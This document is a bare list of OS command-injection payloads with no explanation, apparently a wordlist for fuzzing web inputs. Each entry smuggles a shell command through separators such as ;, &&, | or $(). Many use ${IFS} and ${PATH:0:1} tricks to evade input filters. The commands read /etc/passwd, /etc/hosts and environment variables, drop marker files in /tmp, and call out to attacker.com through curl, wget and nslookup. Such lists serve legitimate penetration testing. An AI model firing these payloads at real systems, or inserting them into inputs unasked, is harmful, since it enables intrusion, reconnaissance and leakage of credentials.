;id
&&id
|id
$(id)
`id`
;cat${IFS}/etc/passwd
;uname${IFS}-a
;whoami$IFS
;cat${PATH:0:1}etc${PATH:0:1}passwd
;${IFS}id

;id
&&id
|id
||id
$(id)
`id`

;whoami
&&whoami
|whoami
$(whoami)
`whoami`

;uname${IFS}-a
&&uname${IFS}-a
|uname${IFS}-a
$(uname${IFS}-a)

;cat${IFS}/etc/passwd
&&cat${IFS}/etc/passwd
|cat${IFS}/etc/passwd
$(cat${IFS}/etc/passwd)

;ls${IFS}-la
&&ls${IFS}-la
|ls${IFS}-la
$(ls${IFS}-la)

;ping${IFS}-c${IFS}5${IFS}127.0.0.1
&&ping${IFS}-c${IFS}5${IFS}127.0.0.1

;curl${IFS}http://attacker.com
&&curl${IFS}http://attacker.com

;wget${IFS}http://attacker.com
&&wget${IFS}http://attacker.com

;nslookup${IFS}attacker.com
&&nslookup${IFS}attacker.com

;id$IFS
&&id$IFS
|id$IFS

;whoami$IFS
&&whoami$IFS

;cat$IFS/etc/passwd
&&cat$IFS/etc/passwd

;ls$IFS-la
&&ls$IFS-la

;echo${IFS}test
&&echo${IFS}test

;touch${IFS}/tmp/pwned
&&touch${IFS}/tmp/pwned

;id${IFS}
&&id${IFS}

;cat${IFS}/etc/hosts
&&cat${IFS}/etc/hosts

;hostname${IFS}
&&hostname${IFS}

;uptime${IFS}
&&uptime${IFS}

;ps${IFS}aux
&&ps${IFS}aux

;env${IFS}
&&env${IFS}

;cat${PATH:0:1}etc${PATH:0:1}passwd
&&cat${PATH:0:1}etc${PATH:0:1}passwd

;${IFS}id
&&${IFS}id

;${IFS}whoami
&&${IFS}whoami

;${IFS}uname${IFS}-a
&&${IFS}uname${IFS}-a

;${IFS}cat${IFS}/etc/passwd
&&${IFS}cat${IFS}/etc/passwd

;id||true
;whoami||true
;uname||true

;true||id
;true||whoami

;echo${IFS}pwned
&&echo${IFS}pwned

;id>/tmp/id.txt
&&id>/tmp/id.txt

;whoami>/tmp/whoami.txt
&&whoami>/tmp/whoami.txt
